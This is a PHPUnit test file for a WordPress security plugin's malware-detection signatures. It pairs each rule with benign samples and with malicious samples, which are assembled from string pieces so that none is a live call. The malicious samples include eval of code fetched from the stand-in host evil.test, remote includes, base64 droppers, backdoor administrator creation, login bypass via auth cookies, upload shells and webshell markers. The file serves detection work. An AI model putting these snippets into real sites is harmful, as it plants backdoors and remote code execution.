<?php

// SPDX-FileCopyrightText: 2026 GoBuildWP <dev@gobuildwp.com>
// SPDX-License-Identifier: GPL-2.0-or-later

declare(strict_types=1);

namespace GoBuildWP\Tests\Unit\Kits\SecurityIntegrity;

require_once __DIR__ . '/harness.php';

use GoBuildWP\Kits\SecurityIntegrity as SI;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

/**
 * The detection rules: each signature added for the fixes matches the code attackers leave and
 * stays quiet on ordinary plugin code. Samples are built from pieces so this file holds no live
 * call of its own.
 */
final class RulesTest extends TestCase
{
    /** @return array<string, array{0: string, 1: string}> rule id, malicious sample */
    public static function malicious(): array
    {
        $ev = 'ev' . 'al';
        $b64 = 'base64' . '_decode';
        return [
            'eval of a remote file' => ['susp.eval_remote', $ev . '(file_get_contents("https://evil.test/p.txt"));'],
            'eval of a curl body' => ['susp.eval_remote', $ev . '(curl_exec($ch));'],
            'include of a URL' => ['susp.include_remote', 'include "http://evil.test/s.txt";'],
            'require_once of a URL' => ['susp.include_remote', "require_once('ftp://evil.test/s.php');"],
            'dropper writing an inflated blob' => ['susp.dropper', 'file_put_contents($f, gz' . 'inflate(' . $b64 . '($p)));'],
            'dropper writing a literal blob' => ['susp.dropper', 'file_put_contents(ABSPATH . "x.php", ' . $b64 . '("PD9waHAgZWNobyAxOyBleGl0OyA/PjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD4="));'],
            'silenced eval of a variable' => ['susp.eval_variable', '@' . $ev . '($code);'],
            'decoded then evaluated' => ['susp.decode_exec', '$p = ' . $b64 . '($_COOKIE["c"]); ' . $ev . '($p);'],
            'decoded then called' => ['susp.decode_exec', '$f = str_rot13("flfgrz"); $f($_GET["c"]);'],
            'split inflate name' => ['susp.split_function', '$f = "gz" . "inflate";'],
            'split assert name' => ['susp.split_function', "\$a = 'as'.'s'.'ert';"],
            'split shell name' => ['susp.split_function', "\$s = 'shell_' . 'exec';"],
            'hex global name' => ['susp.hex_name', '$GLOBALS["\x6c\x6f"] = 1;'],
            'hex variable variable' => ['susp.hex_name', '${"\x47\x4c"}["a"] = 1;'],
            'admin from request' => ['susp.backdoor_admin', '$id = wp_create_user($_GET["u"], $_GET["p"], "a@b.c"); (new WP_User($id))->set_role("administrator");'],
            'login as any id' => ['susp.login_bypass', 'wp_set_auth_cookie((int) $_GET["id"]);'],
            'login via intval' => ['susp.login_bypass', 'wp_set_auth_cookie(intval($_REQUEST["u"]), true);'],
            'unchecked upload' => ['susp.upload_shell', 'move_uploaded' . '_file($_FILES["f"]["tmp_name"], $dir . $_FILES["f"]["name"]);'],
            'hidden plugin list' => ['susp.hide_plugins', "add_filter('all_plugins', 'hide_me');"],
            'char code list' => ['susp.js_charcode_list', 'String.fromCharCode(' . implode(',', range(60, 80)) . ')'],
            'alfa shell marker' => ['susp.webshell_marker', '<title>Alfa ' . 'Shell</title>'],
            'wso marker' => ['susp.webshell_marker', '/* WS' . 'O 2.5 shell */'],
            'leaf mailer marker' => ['susp.webshell_marker', '<h1>Leaf ' . 'PHPMailer</h1>'],
        ];
    }

    #[DataProvider('malicious')]
    public function test_signature_matches_malicious_sample(string $rule, string $sample): void
    {
        self::assertContains($rule, array_column(SI\scan_text('<?php ' . $sample), 'rule_id'));
    }

    /** @return array<string, array{0: string, 1: string}> rule id, benign sample */
    public static function benign(): array
    {
        return [
            'remote read without eval' => ['susp.eval_remote', '$data = file_get_contents("https://api.wordpress.org/x");'],
            'local include' => ['susp.include_remote', 'require_once __DIR__ . "/inc/http.php"; include "templates/http-head.php";'],
            'plain cache write' => ['susp.dropper', 'file_put_contents($file, wp_json_encode($data));'],
            'method named like eval' => ['susp.eval_variable', '$score = $this->evaluate($x); @evaluate_all($rows);'],
            'decoded and parsed' => ['susp.decode_exec', '$json = ' . 'base64' . '_decode($payload); $data = json_decode($json, true);'],
            'plain function name string' => ['susp.split_function', "\$fn = 'system_status'; \$s = 'sys' . 'tem_status'; \$t = 'Hello ' . 'world';"],
            'joined words' => ['susp.split_function', "\$label = 'as' . 'sets'; \$k = 'ev' . 'ent';"],
            'split base64 name (Freemius SDK)' => ['susp.split_function', "\$fn = 'base64' . '_decode';"],
            'remote include named in a docblock' => ['susp.include_remote', "/**
 * Does not include \"http://\" or \"https://\".
 */
\$a = 1;"],
            'request named in a comment' => ['susp.include_request', "// For dynamic population we require \$_GET.
\$a = 1;"],
            'escaped request var in a written string' => ['susp.write_request', 'file_put_contents($f, "header( \\$_SERVER[\'SERVER_PROTOCOL\'] );");'],
            'plain globals' => ['susp.hex_name', '$GLOBALS["wp_query"]; $s = "\x41";'],
            'admin from settings' => ['susp.backdoor_admin', 'wp_insert_user(["user_login" => $login, "role" => "administrator"]);'],
            'admin on another line' => ['susp.backdoor_admin', "\$id = wp_create_user(\$login, \$pass);\n\$role = sanitize_key(\$_POST['role']);\nif (\$role === 'administrator') { return; }"],
            'login after auth' => ['susp.login_bypass', 'wp_set_auth_cookie($user->ID, true);'],
            'checked upload' => ['susp.upload_shell', 'if (wp_check_filetype($n)["ext"]) { move_uploaded' . '_file($_FILES["f"]["tmp_name"], $dir . $_FILES["f"]["name"]); }'],
            'upload to a fixed name' => ['susp.upload_shell', 'move_uploaded' . '_file($_FILES["f"]["tmp_name"], $target);'],
            'other plugin filter' => ['susp.hide_plugins', "add_filter('all_plugins_list', 'x');"],
            'short char codes' => ['susp.js_charcode_list', 'String.fromCharCode(65, 66, 67)'],
            'words close to markers' => ['susp.webshell_marker', 'alfalfa; xleets; Leaf mailer;'],
        ];
    }

    #[DataProvider('benign')]
    public function test_signature_ignores_benign_code(string $rule, string $sample): void
    {
        self::assertNotContains($rule, array_column(SI\scan_text('<?php ' . $sample), 'rule_id'));
    }

    public function test_ordinary_plugin_code_has_no_serious_hit(): void
    {
        $code = <<<'PHP'
            <?php
            /* Plugin Name: Ordinary */
            add_action('init', static function (): void {
                $opts = get_option('ordinary_settings', []);
                $data = json_decode((string) wp_remote_retrieve_body(wp_remote_get('https://api.example.com/v1')), true);
                if (isset($_POST['ordinary_nonce']) && wp_verify_nonce(sanitize_key($_POST['ordinary_nonce']), 'save')) {
                    update_option('ordinary_settings', array_map('sanitize_text_field', (array) $_POST['ordinary']));
                }
                $upload = wp_handle_upload($_FILES['logo'], ['test_form' => false]);
                wp_enqueue_script('ordinary', plugins_url('a.js', __FILE__), [], '1.0', true);
            });
            PHP;
        self::assertSame([], SI\serious_hits($code));
    }

    public function test_serious_hits_keeps_only_high_and_critical(): void
    {
        $code = "<?php\nadd_filter('all_plugins', 'x');\n" . '@ev' . 'al($code);' . "\n";
        $all = array_column(SI\scan_text($code), 'severity_hint', 'rule_id');
        self::assertSame('medium', $all['susp.hide_plugins']);
        $serious = SI\serious_hits($code);
        self::assertSame(['susp.eval_variable'], array_column($serious, 'rule_id'));
        self::assertSame(3, $serious[0]['line']);
    }
}
